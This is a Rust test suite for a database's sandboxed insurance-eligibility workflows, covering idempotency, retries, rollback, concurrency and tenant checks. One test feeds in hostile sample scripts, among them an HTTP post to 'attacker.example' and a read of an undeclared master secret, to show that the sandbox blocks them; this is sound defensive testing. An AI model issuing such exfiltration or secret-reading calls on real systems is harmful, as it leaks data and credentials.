use super::*;
use crate::host::tests::{actor, manifest, services};
use crate::{EgressProvider, InMemorySecretProvider, InvocationServices};
use bicdb_core::{BicDb, CollectionPolicy, DbConfig, MutationPolicy, Record};
use bicdb_extension::abi_v2::{
    ContractField, CryptoOperation, EgressDeclaration, EgressResponse, FieldType,
    RawSqlDeclaration, RelationPermission, SecretDeclaration,
};
use bicdb_extension::{ExtensionCapability, ExtensionManifest};
use bicdb_sql::SqlSession;
use bicdb_workflow::{JobContext, Language};
use std::collections::BTreeSet;
use std::sync::{
    atomic::{AtomicUsize, Ordering},
    Arc,
};

struct Insurance {
    status: u16,
    result: Value,
    calls: AtomicUsize,
    barrier: Option<Arc<Rendezvous>>,
}
#[derive(Default)]
struct Rendezvous {
    arrivals: std::sync::Mutex<usize>,
    ready: std::sync::Condvar,
}
impl Rendezvous {
    fn wait(&self) -> crate::Result<()> {
        let mut arrivals = self.arrivals.lock().unwrap();
        *arrivals += 1;
        self.ready.notify_all();
        let (_guard, timeout) = self
            .ready
            .wait_timeout_while(arrivals, std::time::Duration::from_secs(5), |n| *n < 2)
            .unwrap();
        if timeout.timed_out() {
            return Err(crate::AppRuntimeError::Timeout(
                "insurance rendezvous timed out".into(),
            ));
        }
        Ok(())
    }
}
impl EgressProvider for Insurance {
    fn execute(
        &self,
        _plugin: &str,
        policy: &EgressDeclaration,
        _secret: Option<&crate::SecretRecord>,
        method: &str,
        url: &str,
        headers: &[(String, String)],
        body: &[u8],
        timeout: u64,
    ) -> crate::Result<EgressResponse> {
        let parsed = url::Url::parse(url).unwrap();
        if !policy.hosts.contains(parsed.host_str().unwrap_or(""))
            || !policy.schemes.contains(parsed.scheme())
        {
            return Err(crate::AppRuntimeError::CapabilityDenied(
                "destination forbidden".into(),
            ));
        }
        assert_eq!(method, "POST");
        assert!(timeout > 0 && timeout <= 8000);
        assert!(headers.contains(&("Authorization".into(), "Bearer synthetic-api-key".into())));
        assert!(headers
            .iter()
            .any(|(name, value)| name == "Idempotency-Key" && value.starts_with("eligibility:")));
        let request: Value = serde_json::from_slice(body).unwrap();
        assert_eq!(request["member_id"], "member-1");
        self.calls.fetch_add(1, Ordering::SeqCst);
        if let Some(barrier) = &self.barrier {
            barrier.wait()?;
        }
        Ok(EgressResponse {
            status: self.status,
            headers: vec![],
            body: self.result.to_string().into_bytes(),
        })
    }
}

struct Fixture {
    dir: tempfile::TempDir,
    db: Box<BicDb>,
    manifest: Arc<ExtensionManifest>,
    insurance: Arc<Insurance>,
}
const TABLES: &[&str] = &[
    "appointments",
    "patient_insurance",
    "insurance_checks",
    "staff_tasks",
    "notification_outbox",
    "workflow_runs",
];
fn field(name: &str, kind: FieldType) -> ContractField {
    ContractField {
        name: name.into(),
        storage_name: None,
        field_type: kind,
        value_type: None,
        nullable: false,
        generated: false,
        generated_expression: None,
        default_json: None,
    }
}
fn statement(
    id: &str,
    sql: &str,
    relations: &[&str],
    actions: &[DatabaseAction],
    parameters: Vec<FieldType>,
    result: Vec<ContractField>,
) -> RawSqlDeclaration {
    RawSqlDeclaration {
        id: id.into(),
        sql: sql.into(),
        sha256: format!("{:x}", Sha256::digest(sql.as_bytes())),
        relations: relations.iter().map(|r| r.to_string()).collect(),
        routines: if sql.contains("current_setting") {
            BTreeSet::from(["current_setting".into()])
        } else {
            BTreeSet::new()
        },
        actions: actions.iter().copied().collect(),
        parameters,
        result,
        max_affected_rows: 10,
    }
}
impl Fixture {
    fn new(status: u16, result: Value) -> Self {
        let dir = tempfile::tempdir().unwrap();
        let mut db = Box::new(
            BicDb::open_with_config(dir.path().join("db"), DbConfig::default().with_fsync(true))
                .unwrap(),
        );
        {
            let mut sql = SqlSession::new(&mut db);
            for ddl in [
                "CREATE TABLE appointments (id TEXT PRIMARY KEY, patient_id TEXT NOT NULL, insurance_id TEXT NOT NULL, starts_at TEXT NOT NULL, status TEXT NOT NULL, revision BIGINT NOT NULL, coverage_status TEXT NOT NULL, tenant_id TEXT NOT NULL)",
                "CREATE TABLE patient_insurance (id TEXT PRIMARY KEY, member_id TEXT NOT NULL, payer_code TEXT NOT NULL, tenant_id TEXT NOT NULL)",
                "CREATE TABLE insurance_checks (id TEXT PRIMARY KEY, appointment_id TEXT NOT NULL, eligible BOOLEAN NOT NULL, provider_reference TEXT NOT NULL, tenant_id TEXT NOT NULL)",
                "CREATE TABLE staff_tasks (id TEXT PRIMARY KEY, appointment_id TEXT NOT NULL, team TEXT NOT NULL, title TEXT NOT NULL, status TEXT NOT NULL, tenant_id TEXT NOT NULL)",
                "CREATE TABLE notification_outbox (id TEXT PRIMARY KEY, patient_id TEXT NOT NULL, template TEXT NOT NULL, payload TEXT NOT NULL, status TEXT NOT NULL, tenant_id TEXT NOT NULL)",
                "CREATE TABLE workflow_runs (id TEXT PRIMARY KEY, operation_key TEXT UNIQUE NOT NULL, appointment_id TEXT NOT NULL, outcome TEXT NOT NULL, tenant_id TEXT NOT NULL)",
            ] {sql.execute(ddl).unwrap();}
        }
        db.insert("appointments",Record::new("a1").with_metadata(json!({"id":"a1","patient_id":"p1","insurance_id":"i1","starts_at":"2026-10-01","status":"booked","revision":1,"coverage_status":"unchecked","tenant_id":"tenant-1"}))).unwrap();
        db.insert("appointments",Record::new("a2").with_metadata(json!({"id":"a2","patient_id":"p1","insurance_id":"i1","starts_at":"2026-10-01","status":"booked","revision":1,"coverage_status":"unchecked","tenant_id":"tenant-1"}))).unwrap();
        db.insert("patient_insurance",Record::new("i1").with_metadata(json!({"id":"i1","member_id":"member-1","payer_code":"payer-1","tenant_id":"tenant-1"}))).unwrap();
        for table in TABLES {
            db.set_collection_policy(
                table,
                CollectionPolicy::tenant_field("tenant_id")
                    .with_read_roles(["editor"])
                    .with_write_roles(["editor"]),
            )
            .unwrap();
            db.set_mutation_policy(
                table,
                MutationPolicy::grants_required().with_tenant_field("tenant_id"),
            )
            .unwrap();
        }
        bicdb_workflow::initialize(&mut db).unwrap();
        let mut extension = (*manifest()).clone();
        extension
            .capabilities
            .insert(ExtensionCapability::NetworkEgress);
        extension.permissions.read_relations = TABLES.iter().map(|r| r.to_string()).collect();
        extension.permissions.write_relations = extension.permissions.read_relations.clone();
        let application = extension.application.as_deref_mut().unwrap();
        application.relation_permissions = TABLES
            .iter()
            .map(|r| RelationPermission {
                relation: r.to_string(),
                actions: BTreeSet::from([
                    DatabaseAction::Select,
                    DatabaseAction::Insert,
                    DatabaseAction::Update,
                    DatabaseAction::Lock,
                ]),
                readable_columns: BTreeSet::new(),
                writable_columns: [
                    "id",
                    "operation_key",
                    "appointment_id",
                    "patient_id",
                    "eligible",
                    "provider_reference",
                    "coverage_status",
                    "revision",
                    "team",
                    "title",
                    "status",
                    "template",
                    "payload",
                    "outcome",
                    "tenant_id",
                ]
                .iter()
                .map(|s| s.to_string())
                .collect(),
            })
            .collect();
        use DatabaseAction::{Insert, Lock, Select, Update};
        use FieldType::{Bool as B, Int64 as I, String as S};
        application.raw_sql = vec![
            statement("operation_completed","SELECT EXISTS (SELECT 1 FROM workflow_runs WHERE operation_key = $1) AS completed", &["workflow_runs"], &[Select],vec![S],vec![field("completed",B)]),
            statement("load_appointment","SELECT a.id, a.patient_id, a.starts_at, a.status, a.revision, i.member_id, i.payer_code FROM appointments a JOIN patient_insurance i ON i.id = a.insurance_id WHERE a.id = $1", &["appointments","patient_insurance"], &[Select],vec![S],vec![field("id",S),field("patient_id",S),field("starts_at",S),field("status",S),field("revision",I),field("member_id",S),field("payer_code",S)]),
            statement("lock_appointment","SELECT status, revision FROM appointments WHERE id = $1 FOR UPDATE", &["appointments"], &[Select,Lock],vec![S],vec![field("status",S),field("revision",I)]),
            statement("insert_check","INSERT INTO insurance_checks (id, appointment_id, eligible, provider_reference, tenant_id) VALUES ($1, $2, $3, $4, current_setting('bicdb.current_tenant'))", &["insurance_checks"], &[Insert],vec![S,S,B,S],vec![]),
            statement("update_coverage","UPDATE appointments SET coverage_status = $1, revision = revision + 1 WHERE id = $2", &["appointments"], &[Update],vec![S,S],vec![]),
            statement("insert_task","INSERT INTO staff_tasks (id, appointment_id, team, title, status, tenant_id) VALUES ($1, $2, 'billing', $3, 'open', current_setting('bicdb.current_tenant'))", &["staff_tasks"], &[Insert],vec![S,S,S],vec![]),
            statement("insert_notification","INSERT INTO notification_outbox (id, patient_id, template, payload, status, tenant_id) VALUES ($1, $2, $3, $4, 'pending', current_setting('bicdb.current_tenant'))", &["notification_outbox"], &[Insert],vec![S,S,S,S],vec![]),
            statement("complete_operation","INSERT INTO workflow_runs (id, operation_key, appointment_id, outcome, tenant_id) VALUES ($1, $1, $2, $3, current_setting('bicdb.current_tenant'))", &["workflow_runs"], &[Insert],vec![S,S,S],vec![]),
            statement("bump_revision","UPDATE appointments SET revision = revision + 1 WHERE id = $1", &["appointments"], &[Update],vec![S],vec![]),
        ];
        application.secrets = vec![SecretDeclaration {
            name: "insurance_api".into(),
            operations: BTreeSet::from([CryptoOperation::PlaintextRead]),
            versions: BTreeSet::new(),
            allow_plaintext_read: true,
        }];
        application.egress = vec![EgressDeclaration {
            name: "insurance".into(),
            provider: None,
            required_provider_headers: BTreeSet::new(),
            schemes: BTreeSet::from(["https".into()]),
            hosts: BTreeSet::from(["insurance.example".into()]),
            ports: BTreeSet::from([443]),
            allow_redirects: false,
            allow_private_networks: false,
            mtls_secret: None,
            max_request_bytes: 4096,
            max_response_bytes: 4096,
            timeout_ms: 8000,
            max_concurrency: 2,
            requests_per_minute: 60,
        }];
        Self {
            dir,
            db,
            manifest: Arc::new(extension),
            insurance: Arc::new(Insurance {
                status,
                result,
                calls: AtomicUsize::new(0),
                barrier: None,
            }),
        }
    }
    fn host(&self) -> CapabilityHost {
        let mut authority = actor(now_ms().unwrap() + 60_000);
        authority.roles.insert("editor".into());
        let secrets = InMemorySecretProvider::default();
        secrets
            .insert(
                "insurance_api",
                "1",
                "api-key",
                "opaque",
                b"synthetic-api-key".to_vec(),
                true,
            )
            .unwrap();
        let mut invocation: InvocationServices = services(self.dir.path());
        invocation.secrets = Arc::new(secrets);
        invocation.egress = self.insurance.clone();
        CapabilityHost::new(&self.db, self.manifest.clone(), authority, invocation).unwrap()
    }
    fn publish(&mut self, language: Language, source: &str) -> (ScriptVersion, WorkflowJob) {
        let script = bicdb_workflow::publish_version(
            &mut self.db,
            "tenant-1",
            "eligibility",
            "v1",
            language,
            source,
            &bicdb_script::Limits::default(),
        )
        .unwrap();
        let job = WorkflowJob {
            tenant: "tenant-1".into(),
            workflow: "eligibility".into(),
            version: "v1".into(),
            event_id: "event-1".into(),
            event: json!({"id":"event-1","appointment_id":"a1","tenant":"attacker"}),
            context: JobContext {
                tenant: "tenant-1".into(),
                principal: self.host().actor().user_id.clone().unwrap(),
                roles: vec!["forged-admin".into()],
                trace_id: "trace-job".into(),
            },
        };
        (script, job)
    }
    fn run(&self, script: &ScriptVersion, job: &WorkflowJob) -> Result<ScriptWorkflowOutcome> {
        execute_script_workflow(
            script,
            job,
            self.host(),
            ScriptWorkflowOptions {
                egress_policy: Some("insurance".into()),
                ..Default::default()
            },
        )
    }
    fn count(&mut self, table: &str) -> usize {
        self.db
            .secure(
                &bicdb_core::SecurityContext::trusted_internal("test", "tenant-1")
                    .with_roles(["editor"]),
            )
            .scan_collection(table)
            .unwrap()
            .len()
    }
    fn appointment(&mut self) -> Arc<Record> {
        self.db
            .secure(
                &bicdb_core::SecurityContext::trusted_internal("test", "tenant-1")
                    .with_roles(["editor"]),
            )
            .get("appointments", "a1")
            .unwrap()
            .unwrap()
    }
}
const TYPESCRIPT: &str = include_str!("../../../examples/workflows/eligibility.ts");
const LUA: &str = include_str!("../../../examples/workflows/eligibility.lua");

#[test]
fn eligibility_lua_and_typescript_commit_five_tables_once_and_validate_external_data() {
    for (language, source) in [(Language::TypeScript, TYPESCRIPT), (Language::Lua, LUA)] {
        let mut fixture = Fixture::new(200, json!({"eligible":false,"reference":"ref-1"}));
        let (script, job) = fixture.publish(language, source);
        let outcome = fixture.run(&script, &job).unwrap();
        assert_eq!(
            outcome,
            ScriptWorkflowOutcome::Completed(
                json!({"status":"completed","coverage":"needs_review","staff_review_created":true})
            )
        );
        for table in [
            "insurance_checks",
            "staff_tasks",
            "notification_outbox",
            "workflow_runs",
        ] {
            assert_eq!(fixture.count(table), 1);
        }
        let appointment = fixture.appointment();
        assert_eq!(appointment.metadata["revision"], 2);
        assert_eq!(appointment.metadata["coverage_status"], "needs_review");
        assert_eq!(
            fixture.run(&script, &job).unwrap(),
            ScriptWorkflowOutcome::Completed(json!({"status":"already_completed"}))
        );
        assert_eq!(fixture.insurance.calls.load(Ordering::SeqCst), 1);
        let mut invalid = Fixture::new(200, json!({"eligible":"yes","reference":"ref-1"}));
        let (script, job) = invalid.publish(language, source);
        assert!(invalid.run(&script, &job).is_err());
        assert_eq!(invalid.count("insurance_checks"), 0);
    }
}

#[test]
fn eligibility_retries_temporary_errors_and_rejects_stale_results_and_transaction_http() {
    for (language, source) in [(Language::TypeScript, TYPESCRIPT), (Language::Lua, LUA)] {
        let mut fixture = Fixture::new(429, json!({}));
        let (script, job) = fixture.publish(language, source);
        assert_eq!(
            fixture.run(&script, &job).unwrap(),
            ScriptWorkflowOutcome::Retry { delay_ms: 60_000 }
        );
        assert_eq!(fixture.count("workflow_runs"), 0);
        assert_eq!(
            fixture.appointment().metadata["coverage_status"],
            "unchecked"
        );
        let source = if language == Language::Lua {
            source.replace(
                "local response =",
                "db.execute('bump_revision', {event.appointment_id})\nlocal response =",
            )
        } else {
            source.replace(
                "const response =",
                "db.execute('bump_revision', [event.appointment_id]);\nconst response =",
            )
        };
        let mut stale = Fixture::new(200, json!({"eligible":true,"reference":"ref-1"}));
        let (script, job) = stale.publish(language, &source);
        assert_eq!(
            stale.run(&script, &job).unwrap(),
            ScriptWorkflowOutcome::Completed(json!({"status":"stale_result"}))
        );
        assert_eq!(stale.count("insurance_checks"), 0);
    }
    let mut fixture = Fixture::new(200, json!({"eligible":true,"reference":"ref-1"}));
    let (script,job) = fixture.publish(Language::TypeScript,"function workflow() { return db.transaction(tx => http.post('https://insurance.example/v1/eligibility', {json:{}})); }");
    assert!(fixture
        .run(&script, &job)
        .unwrap_err()
        .contains("HTTP is forbidden"));
    assert_eq!(fixture.insurance.calls.load(Ordering::SeqCst), 0);
}

#[test]
fn eligibility_transaction_rolls_back_all_five_writes_on_error() {
    let mut fixture = Fixture::new(200, json!({"eligible":false,"reference":"ref-1"}));
    let source = TYPESCRIPT.replace("tx.execute(\"complete_operation\", [operationKey, appointment.id, coverage]);", "tx.execute(\"complete_operation\", [operationKey, appointment.id, coverage]); throw new Error('abort after all five writes');");
    let (script, job) = fixture.publish(Language::TypeScript, &source);
    assert!(fixture.run(&script, &job).is_err());
    for table in [
        "insurance_checks",
        "staff_tasks",
        "notification_outbox",
        "workflow_runs",
    ] {
        assert_eq!(fixture.count(table), 0);
    }
    assert_eq!(fixture.appointment().metadata["revision"], 1);
}

#[test]
fn workflow_interrupt_rolls_back_unwrapped_transaction_and_releases_locks() {
    let mut fixture = Fixture::new(200, json!({}));
    let source = "function workflow() { __host('db.begin', '[]'); __host('tx.execute', JSON.stringify(['bump_revision',['a1']])); while(true) {} }";
    let (script, job) = fixture.publish(Language::TypeScript, source);
    let outcome = execute_script_workflow(
        &script,
        &job,
        fixture.host(),
        ScriptWorkflowOptions {
            limits: bicdb_script::Limits {
                timeout: std::time::Duration::from_millis(300),
                ..Default::default()
            },
            ..Default::default()
        },
    );
    assert!(outcome.is_err());
    assert_eq!(fixture.appointment().metadata["revision"], 1);
    // Another invocation can obtain the same row after interruption.
    let replacement =
        "function workflow(event) { return db.execute('bump_revision',[event.appointment_id]); }";
    let script = bicdb_workflow::publish_version(
        &mut fixture.db,
        "tenant-1",
        "eligibility",
        "v2",
        Language::TypeScript,
        replacement,
        &bicdb_script::Limits::default(),
    )
    .unwrap();
    let mut job = job;
    job.version = "v2".into();
    assert!(fixture.run(&script, &job).is_ok());
    assert_eq!(fixture.appointment().metadata["revision"], 2);
}

#[test]
fn eligibility_hot_activation_keeps_queued_rules_and_worker_settlement_is_durable() {
    let mut fixture = Fixture::new(200, json!({"eligible":true,"reference":"ref-1"}));
    let (script, job) = fixture.publish(Language::TypeScript, TYPESCRIPT);
    let revised = TYPESCRIPT.replace(
        "const REVIEW_VERIFIED = false",
        "const REVIEW_VERIFIED = true",
    );
    bicdb_workflow::publish_version(
        &mut fixture.db,
        "tenant-1",
        "eligibility",
        "v2",
        Language::TypeScript,
        &revised,
        &bicdb_script::Limits::default(),
    )
    .unwrap();
    let mut tx = fixture.db.begin_transaction().unwrap();
    bicdb_workflow::activate_version(&mut tx, "tenant-1", "eligibility", &script.version).unwrap();
    bicdb_workflow::enqueue_on_commit(
        &mut tx,
        "eligibility",
        "event-1",
        job.event.clone(),
        job.context.clone(),
    )
    .unwrap();
    tx.commit().unwrap();
    let mut tx = fixture.db.begin_transaction().unwrap();
    bicdb_workflow::activate_version(&mut tx, "tenant-1", "eligibility", "v2").unwrap();
    bicdb_workflow::enqueue_on_commit(
        &mut tx,
        "eligibility",
        "event-2",
        json!({"id":"event-2","appointment_id":"a2"}),
        job.context.clone(),
    )
    .unwrap();
    tx.commit().unwrap();
    let deliveries = fixture
        .db
        .broker()
        .consume(
            bicdb_workflow::QUEUE,
            "workers",
            "worker-1",
            bicdb_core::ConsumeOptions {
                max_messages: 2,
                ..Default::default()
            },
        )
        .unwrap();
    assert_eq!(deliveries.len(), 2);
    for (index, delivery) in deliveries.iter().enumerate() {
        let host = fixture.host();
        let result = execute_script_delivery(
            &mut fixture.db,
            "worker-1",
            delivery,
            host,
            ScriptWorkflowOptions {
                egress_policy: Some("insurance".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(
            result,
            ScriptWorkflowOutcome::Completed(
                json!({"status":"completed","coverage":"verified","staff_review_created":index==1})
            )
        );
    }
    assert_eq!(fixture.count("staff_tasks"), 1);
    assert_eq!(fixture.count("notification_outbox"), 2);
    assert_eq!(fixture.count("workflow_runs"), 2);
    assert!(fixture
        .db
        .broker()
        .consume(
            bicdb_workflow::QUEUE,
            "workers",
            "worker-2",
            bicdb_core::ConsumeOptions::default()
        )
        .unwrap()
        .is_empty());
    let mut retry = Fixture::new(503, json!({}));
    let (script, job) = retry.publish(Language::Lua, LUA);
    let mut tx = retry.db.begin_transaction().unwrap();
    bicdb_workflow::activate_version(&mut tx, "tenant-1", "eligibility", &script.version).unwrap();
    bicdb_workflow::enqueue_on_commit(
        &mut tx,
        "eligibility",
        "event-1",
        job.event.clone(),
        job.context.clone(),
    )
    .unwrap();
    tx.commit().unwrap();
    let delivery = retry
        .db
        .broker()
        .consume(
            bicdb_workflow::QUEUE,
            "workers",
            "worker-1",
            bicdb_core::ConsumeOptions::default(),
        )
        .unwrap()
        .pop()
        .unwrap();
    let host = retry.host();
    assert_eq!(
        execute_script_delivery(
            &mut retry.db,
            "worker-1",
            &delivery,
            host,
            ScriptWorkflowOptions {
                egress_policy: Some("insurance".into()),
                ..Default::default()
            }
        )
        .unwrap(),
        ScriptWorkflowOutcome::Retry { delay_ms: 60_000 }
    );
    assert_eq!(
        retry
            .db
            .broker()
            .group_info(bicdb_workflow::QUEUE, "workers")
            .unwrap()
            .pending_redelivery,
        1
    );
    assert_eq!(retry.count("insurance_checks"), 0);
    drop(retry.db);
    let mut reopened = BicDb::open_with_config(
        retry.dir.path().join("db"),
        DbConfig::default().with_fsync(true),
    )
    .unwrap();
    assert_eq!(
        reopened
            .broker()
            .group_info(bicdb_workflow::QUEUE, "workers")
            .unwrap()
            .pending_redelivery,
        1
    );
}

#[test]
fn workflow_rejects_undeclared_sql_secret_wrong_tenant_and_outbound_destination() {
    for source in [
        "function workflow() { return db.one('SELECT * FROM bicdb_script_versions'); }",
        "function workflow() { return secrets.get('operator_master'); }",
        "function workflow() { return http.post('https://attacker.example/', {json:{}}); }",
    ] {
        let mut fixture = Fixture::new(200, json!({}));
        let (script, job) = fixture.publish(Language::TypeScript, source);
        assert!(fixture.run(&script, &job).is_err());
        assert_eq!(fixture.insurance.calls.load(Ordering::SeqCst), 0);
    }
    let mut fixture = Fixture::new(200, json!({"eligible":true,"reference":"ref-1"}));
    let (script, mut job) = fixture.publish(Language::TypeScript, TYPESCRIPT);
    job.tenant = "another-clinic".into();
    assert!(fixture
        .run(&script, &job)
        .unwrap_err()
        .contains("tenant mismatch"));
}

#[test]
fn concurrent_eligibility_attempts_commit_only_one_operation_and_notification() {
    let mut fixture = Fixture::new(200, json!({"eligible":false,"reference":"ref-1"}));
    let (script, job) = fixture.publish(Language::TypeScript, TYPESCRIPT);
    Arc::get_mut(&mut fixture.insurance).unwrap().barrier = Some(Arc::new(Rendezvous::default()));
    let first = fixture.host();
    let second = fixture.host();
    let outcomes = std::thread::scope(|scope| {
        let script = &script;
        let job = &job;
        let options = || ScriptWorkflowOptions {
            egress_policy: Some("insurance".into()),
            ..Default::default()
        };
        let a = scope.spawn(move || execute_script_workflow(script, job, first, options()));
        let b = scope.spawn(move || execute_script_workflow(script, job, second, options()));
        [a.join().unwrap(), b.join().unwrap()]
    });
    assert_eq!(outcomes.iter().filter(|result| matches!(result,Ok(ScriptWorkflowOutcome::Completed(value)) if value["status"] == "completed")).count(),1,"{outcomes:?}");
    for table in [
        "insurance_checks",
        "staff_tasks",
        "notification_outbox",
        "workflow_runs",
    ] {
        assert_eq!(fixture.count(table), 1);
    }
    assert_eq!(fixture.appointment().metadata["revision"], 2);
    assert_eq!(
        fixture.run(&script, &job).unwrap(),
        ScriptWorkflowOutcome::Completed(json!({"status":"already_completed"}))
    );
}
